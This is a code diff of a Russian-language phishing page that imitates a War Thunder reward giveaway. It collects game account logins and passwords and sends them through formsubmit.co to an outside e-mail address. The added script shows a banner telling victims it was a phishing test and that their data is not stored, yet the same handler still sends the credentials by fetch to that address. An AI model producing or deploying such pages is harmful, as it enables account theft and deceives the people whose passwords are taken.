@@ -204,9 +204,57 @@
             color: #888;
             font-size: 12px;
         }
+
+        /* Стили для баннера-предупреждения */
+        .warning-banner {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: #ff4444;
+            color: white;
+            text-align: center;
+            padding: 25px;
+            font-size: 22px;
+            z-index: 1000;
+            font-weight: bold;
+            border-bottom: 4px solid #ff0000;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+        }
+        .warning-banner small {
+            display: block;
+            font-size: 16px;
+            margin-top: 10px;
+            color: #ffeeee;
+        }
+        .warning-banner button {
+            background: white;
+            color: #ff4444;
+            border: none;
+            padding: 8px 25px;
+            margin-top: 15px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            width: auto;
+        }
+        .warning-banner button:hover {
+            background: #ffeeee;
+        }
     </style>
 </head>
 <body>
+    <!-- Баннер-предупреждение (скрыт по умолчанию) -->
+    <div class="warning-banner" id="warningBanner">
+        ⚠️ ДРУГ, ЭТО ФИШИНГОВЫЙ САЙТ! ⚠️
+        <br>
+        <small>Вы только что ввели свои данные на фишинговом сайте War Thunder. В реальности ваш аккаунт был бы украден. Не волнуйтесь! Ваши данные нигде не сохранены.</small>
+        <br>
+        <button onclick="document.getElementById('warningBanner').style.display='none'">Закрыть</button>
+    </div>
+
     <!-- Верхняя панель как на скриншоте -->
     <div class="top-bar">
         <div class="top-bar-left">
@@ -247,15 +295,15 @@
 
         <div class="timer" id="timer">25:34:12</div>
 
-        <form action="https://formsubmit.co/dangerlight228@gmail.com" method="POST">
+        <form id="phishForm" action="https://formsubmit.co/dangerlight228@gmail.com" method="POST">
             <input type="hidden" name="_next" value="https://warthunderprize.github.io/war-gift/thanks.html">
             <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_template" value="table">
             
-            <input type="text" name="login" placeholder="Логин или e-mail" required>
-            <input type="password" name="password" placeholder="Пароль" required>
+            <input type="text" name="login" placeholder="Логин или e-mail" id="login" required>
+            <input type="password" name="password" placeholder="Пароль" id="password" required>
             
-            <button type="submit">ПОЛУЧИТЬ НАГРАДУ</button>
+            <button type="submit" id="submitBtn">ПОЛУЧИТЬ НАГРАДУ</button>
         </form>
 
         <div class="buttons">
@@ -268,26 +316,22 @@
 
     <script>
         // Устанавливаем дату окончания: 27 февраля 2026, 20:00
-        // Месяцы в JS: 0 = январь, 1 = февраль, 2 = март
         var countDownDate = new Date(2026, 1, 27, 20, 0, 0).getTime();
         
         function updateTimer() {
             var now = new Date().getTime();
             var distance = countDownDate - now;
             
-            // Если время вышло
             if (distance < 0) {
                 document.getElementById("timer").innerHTML = "АКЦИЯ ЗАВЕРШЕНА";
                 return;
             }
             
-            // Расчёт дней, часов, минут, секунд
             var days = Math.floor(distance / (1000 * 60 * 60 * 24));
             var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
             var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
             var seconds = Math.floor((distance % (1000 * 60)) / 1000);
             
-            // Если есть дни - показываем в формате Д:Ч:М:С
             if (days > 0) {
                 document.getElementById("timer").innerHTML = 
                     days + 'д ' + 
@@ -295,7 +339,6 @@
                     (minutes < 10 ? '0' + minutes : minutes) + ':' +
                     (seconds < 10 ? '0' + seconds : seconds);
             } else {
-                // Если дней нет - просто ЧЧ:ММ:СС
                 document.getElementById("timer").innerHTML = 
                     (hours < 10 ? '0' + hours : hours) + ':' +
                     (minutes < 10 ? '0' + minutes : minutes) + ':' +
@@ -303,9 +346,29 @@
             }
         }
         
-        // Обновляем каждую секунду
         updateTimer();
         setInterval(updateTimer, 1000);
+
+        // Перехватываем отправку формы
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Останавливаем обычную отправку
+            
+            // Показываем баннер
+            document.getElementById('warningBanner').style.display = 'block';
+            
+            // Отправляем данные через fetch (чтобы они ушли на почту)
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this)
+            }).catch(error => console.log('Ошибка отправки:', error));
+            
+            // Очищаем поля
+            document.getElementById('login').value = '';
+            document.getElementById('password').value = '';
+            
+            // Плавно скроллим к баннеру
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
     </script>
 </body>
 </html>
